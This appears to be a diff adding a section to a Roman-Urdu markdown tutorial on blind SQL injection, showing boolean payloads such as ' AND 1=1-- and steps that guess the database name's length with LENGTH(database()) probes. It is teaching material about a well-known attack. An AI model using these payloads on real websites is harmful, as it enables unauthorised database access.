@@ -112,3 +112,20 @@ Blind SQLi main error direct show nhi hota hamy database sy questions krny hoty 
 Basic Payload
 `' AND 1=1--` `' AND 1=2--`
 `1' AND 1=1#` `1' AND 1=2#`
+
+### Database ki length pata lagwana
+
+Ab hum database se True/False wale sawal poochenge. Pehle poochna hai ke Current Database Name ki length kitni hai:
+
+`1' AND LENGTH(database())=1#`
+
+**(Agar page normal load hua yani lenth 1 nhi hai too isko barhain gy)**
+
+
+`1' AND LENGTH(database())=2#`
+
+**(phir normal load hua phir barhaein gy)**
+
+`1' AND LENGTH(database())=4#`
+
+ab agar waqai main 4 length hue too page pr kuch changing aye gi ya kuch show hoo jaye ga
